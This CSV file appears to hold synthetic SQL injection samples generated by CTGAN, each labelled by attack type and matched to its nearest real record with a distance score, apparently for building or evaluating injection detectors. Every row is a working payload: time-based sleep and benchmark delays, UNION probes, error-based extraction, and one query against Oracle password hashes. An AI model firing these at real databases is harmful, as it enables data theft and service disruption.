CTGAN_000288,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R005913,3.5147473786760757
CTGAN_000289,attack,other,"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R002011,2.891435166729201
CTGAN_000290,attack,other,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",nearest_attack_euclidean,R003441,4.054931305941492
CTGAN_000291,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R004646,3.4458305147620343
CTGAN_000292,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001417,4.651017384187746
CTGAN_000293,attack,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,9.90075030629133
CTGAN_000294,attack,boolean,"1%""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008782,3.109431006686725
CTGAN_000295,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,5.927454614132068
CTGAN_000296,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R002533,2.926366938308018
CTGAN_000297,attack,union,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",nearest_attack_euclidean,R005578,2.2534967256294482
CTGAN_000298,attack,error,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R002464,4.910006760435292
CTGAN_000299,attack,error,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",nearest_attack_euclidean,R006105,5.363445726854645
CTGAN_000300,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000757,3.360612259726445
CTGAN_000301,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",nearest_attack_euclidean,R005767,5.707030992037324
CTGAN_000302,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R001282,3.9598875845366326
CTGAN_000303,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,6.810368122519648
CTGAN_000304,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R007369,4.111980076456355
CTGAN_000305,attack,other,"elt  (  2567  =  9921,9921  )  ",nearest_attack_euclidean,R007097,1.84506746018432
CTGAN_000306,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R006628,3.452351471609678
CTGAN_000307,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,3.1691402371885378
CTGAN_000308,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R001119,3.3246040850665204
CTGAN_000309,attack,error,"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",nearest_attack_euclidean,R007137,4.187173321347761
CTGAN_000310,attack,boolean,1  )   and 3861  =  5813--,nearest_attack_euclidean,R006311,2.0020536906996886
CTGAN_000311,attack,error,"-7345%"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R006116,4.703501641662965
CTGAN_000312,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R004423,2.694641615795648
CTGAN_000313,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R007736,2.895502656101338
CTGAN_000314,attack,union,"-8005""  )   union all select 5213,5213,5213,5213,5213--",nearest_attack_euclidean,R007740,3.7082313595353846
CTGAN_000315,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R001212,5.754789231086738
CTGAN_000316,attack,error,"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R008800,5.013953732448377
CTGAN_000317,attack,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000245,3.593513905101863
CTGAN_000318,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R004232,5.538572811018535
CTGAN_000319,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,3.605532357351441
CTGAN_000320,attack,union,"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",nearest_attack_euclidean,R003419,3.3491419190373937
CTGAN_000321,attack,boolean,"1""  )   and 2954  =  1256--",nearest_attack_euclidean,R005521,2.4836002096193797
CTGAN_000322,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,4.024144862349664
CTGAN_000323,attack,boolean,-1879%'   )    )    or 3038  =  3038,nearest_attack_euclidean,R006657,2.56354524378801
CTGAN_000324,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.163265337044434
CTGAN_000325,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,4.63293106298553
CTGAN_000326,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003723,6.5861377291286844
CTGAN_000327,attack,error,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R003115,5.973257718523261
CTGAN_000328,attack,boolean,"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""kzcd""  =  ""kzcd",nearest_attack_euclidean,R008021,2.7434064655055437
CTGAN_000329,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,6.8063309494943685
CTGAN_000330,attack,other,1 where 4844  =  4844,nearest_attack_euclidean,R001409,2.8799247485693247
CTGAN_000331,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,3.3426124088399027
CTGAN_000332,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R006790,5.314032145019395
CTGAN_000333,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb",nearest_attack_euclidean,R001069,2.280870962672948
CTGAN_000334,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R006726,3.8500837419115905
CTGAN_000335,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R006713,4.729385764317044
CTGAN_000336,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R002146,4.066051299410875
CTGAN_000337,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R004771,3.0946476293764102
CTGAN_000338,attack,other,"grant connect to name, grant resource to name,",nearest_attack_euclidean,R009018,5.013583276269903
CTGAN_000339,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003569,4.257822460609081
CTGAN_000340,attack,error,"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh",nearest_attack_euclidean,R001495,4.670750095905355
CTGAN_000341,attack,error,"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R006864,4.046781287261933
CTGAN_000342,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000108,32.32725406188758
CTGAN_000343,attack,error,"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",nearest_attack_euclidean,R004617,4.448048076238653
CTGAN_000344,attack,boolean,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",nearest_attack_euclidean,R005894,6.063309208459695
CTGAN_000345,attack,other,"-2340%"" order by 1#",nearest_attack_euclidean,R007112,4.7549734285571335
CTGAN_000346,attack,other,"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R005930,3.2562471868713665
CTGAN_000347,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R005223,2.8600219544504477
CTGAN_000348,attack,boolean,"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008158,4.740266856534336
CTGAN_000349,attack,other,1' where 4460  =  4460,nearest_attack_euclidean,R001515,2.255908332785371
CTGAN_000350,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000083,4.3523265989228355
CTGAN_000351,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,3.5685329062846316
CTGAN_000352,attack,boolean,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",nearest_attack_euclidean,R005684,1.9629689168179223
CTGAN_000353,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002549,3.3965083276340184
CTGAN_000354,attack,time,1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R005032,3.1149646995961278
CTGAN_000355,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.604100505516727
CTGAN_000356,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R004246,3.3427444748944306
CTGAN_000357,attack,boolean,"1'||  (  select 'wgte' from dual where 6316  =  6316 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",nearest_attack_euclidean,R004153,6.569255052928819
CTGAN_000358,attack,error,"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R003346,3.5485463745268673
CTGAN_000359,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R007681,3.6750754637604106
CTGAN_000360,attack,union,"1"" union all select null,null,null,null--",nearest_attack_euclidean,R001087,3.6816795448009167
CTGAN_000361,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002549,3.7507538289946614
CTGAN_000362,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003806,1.9791616678647952
CTGAN_000363,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R007736,3.435545144786168
CTGAN_000364,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxw'  =  'zlxw",nearest_attack_euclidean,R005156,6.358990208602287
CTGAN_000365,attack,other,"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",nearest_attack_euclidean,R008559,6.980798255366388
CTGAN_000366,attack,other,"1""  )   as frmp where 6073  =  6073",nearest_attack_euclidean,R003308,4.669833615463804
CTGAN_000367,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R002710,3.3411567480899143
CTGAN_000368,attack,other,"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",nearest_attack_euclidean,R007990,5.4780275948039865
CTGAN_000369,attack,error,"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R002837,6.355920669048234
CTGAN_000370,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005957,5.311208695674791
CTGAN_000371,attack,other,1'||  (  select 'ussi' where 8958  =  8958,nearest_attack_euclidean,R005137,3.2882217216243896
CTGAN_000372,attack,error,"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'beju' like 'beju",nearest_attack_euclidean,R001443,5.591312680994891
CTGAN_000373,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R002438,3.009633149646605
CTGAN_000374,attack,boolean,1 and 7533  =  7533-- spzi,nearest_attack_euclidean,R005239,1.9324291826892142
CTGAN_000375,attack,boolean,"1 and make_set  (  9542  =  8888,8888  )  -- idkn",nearest_attack_euclidean,R007212,2.468043914388222
CTGAN_000376,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R007238,6.379242660950767
CTGAN_000377,attack,boolean,"1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",nearest_attack_euclidean,R001329,2.325675622977868
CTGAN_000378,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R006284,3.482122493205205
CTGAN_000379,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,2.4940786067219873
CTGAN_000380,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,3.237418340984202
CTGAN_000381,attack,other,"1"" where 4281  =  4281",nearest_attack_euclidean,R000669,3.672259250953522
CTGAN_000382,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R006413,2.894420430011899
CTGAN_000383,attack,error,"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R003540,5.275106025627488
CTGAN_000384,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",nearest_attack_euclidean,R003348,5.445047682312254
CTGAN_000385,attack,time,1' rlike sleep  (  5  ) ,nearest_attack_euclidean,R007069,4.348950569904264
CTGAN_000386,attack,boolean,"1'  )   where 1646  =  1646 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003538,2.0777356536475886
CTGAN_000387,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R005875,5.206916937630853
CTGAN_000388,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R007076,6.159421003294391
CTGAN_000389,attack,time,1 rlike sleep  (  5  ) ,nearest_attack_euclidean,R008994,3.300213156804831
CTGAN_000390,attack,other, (  case when 8422  =  8452 then 1 else null end  ) ,nearest_attack_euclidean,R006965,2.3119538131351103
CTGAN_000391,attack,boolean,"1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001603,3.6525964615496767
CTGAN_000392,attack,other,"  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R002018,9.189838839038195
CTGAN_000393,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R005816,4.282652404733975
CTGAN_000394,attack,other,1  )   as wshv where 5684  =  5684,nearest_attack_euclidean,R005111,3.214928856823086
CTGAN_000395,attack,other,1' where 8584  =  8584 order by 1#,nearest_attack_euclidean,R008437,3.7799451134537234
CTGAN_000396,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001890,3.125724160292084
CTGAN_000397,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R001282,3.8116018748750253
CTGAN_000398,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,4.022050145275361
CTGAN_000399,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R003939,2.9021039163130276
CTGAN_000400,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000321,6.846177226726864
CTGAN_000401,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R006219,1.8914378414869075
CTGAN_000402,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.1916202981537147
CTGAN_000403,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,10.555626955300346
CTGAN_000404,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",nearest_attack_euclidean,R007642,4.418862931237148
CTGAN_000405,attack,error,"1""  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008311,3.4594083268527274
CTGAN_000406,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R005959,3.302975814643475
CTGAN_000407,attack,union,"1 where 2751  =  2751 union all select null,null,null,null--",nearest_attack_euclidean,R003447,3.672370725191572
CTGAN_000408,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,3.5222773561974177
CTGAN_000409,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,1.9843773434441112
CTGAN_000410,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.7000670467333765
CTGAN_000411,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",nearest_attack_euclidean,R005121,3.9984580417697004
CTGAN_000412,attack,error,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004300,4.479293951564394
CTGAN_000413,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,49.397102888964575
CTGAN_000414,attack,boolean,"-7553%"" or 3571  =  2886",nearest_attack_euclidean,R003359,3.921101809101009
CTGAN_000415,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,3.6677677882699453
CTGAN_000416,attack,time,1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R008831,17.703574407577424
CTGAN_000417,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001118,4.307279124354551
CTGAN_000418,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R005007,3.3857229615138906
CTGAN_000419,attack,boolean,"1%'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R008910,3.846241264956185
CTGAN_000420,attack,time,1 rlike sleep  (  5  )  # urxh,nearest_attack_euclidean,R005740,1.827800561746428
CTGAN_000421,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,1.5616819809764386
CTGAN_000422,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R003516,3.0704534526249523
CTGAN_000423,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,3.834445785382408
CTGAN_000424,attack,time,"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""pnsz"" like ""pnsz",nearest_attack_euclidean,R006277,5.813227436694772
CTGAN_000425,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000969,5.57261625024343
CTGAN_000426,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,14.354475104863784
CTGAN_000427,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.3629593871403745
CTGAN_000428,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R007830,3.221441438578109
